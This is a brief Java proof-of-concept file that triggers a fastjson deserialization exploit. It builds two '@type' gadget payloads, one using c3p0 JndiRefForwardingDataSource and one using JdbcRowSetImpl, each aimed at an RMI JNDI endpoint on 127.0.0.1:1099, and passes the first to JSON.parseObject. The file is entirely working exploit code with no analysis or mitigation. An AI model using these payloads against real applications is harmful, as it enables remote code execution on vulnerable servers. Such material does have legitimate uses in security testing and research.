package com.ocean;

import com.alibaba.fastjson.JSON;

public class fastjson_C3p0 {
    public static void main(String[] args) {
        String poc = "{\"@type\": \"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",\"jndiName\": \"rmi://127.0.0.1:1099/e6pbsf\",\"loginTimeout\":0}";
        String poc1 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/e6pbsf\",\"autoCommit\":true}";
        JSON.parseObject(poc);
    }
}
